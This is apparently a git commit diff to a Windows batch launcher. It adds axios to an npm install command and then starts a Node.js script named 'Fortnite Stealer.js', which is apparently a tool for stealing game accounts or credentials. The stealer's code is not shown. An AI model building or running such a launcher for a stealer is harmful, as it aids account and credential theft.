cf32dcb0cd2d6d552a5ec8ab61bb1313feaee812
XoidFN <162973879+Xoid-FNCS@users.noreply.github.com>
2024-12-05 15:12:41 -0800

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,7 +1,5 @@
 @echo off
 
-:: Install the required npm packages
-start cmd /k "npm install blessed chalk && echo Packages installed successfully. && pause && exit"
+start cmd /k "npm install axios blessed chalk && echo Packages installed successfully. && pause && exit"
 
-:: Run the Node.js script
 start cmd /k node "Fortnite Stealer.js"
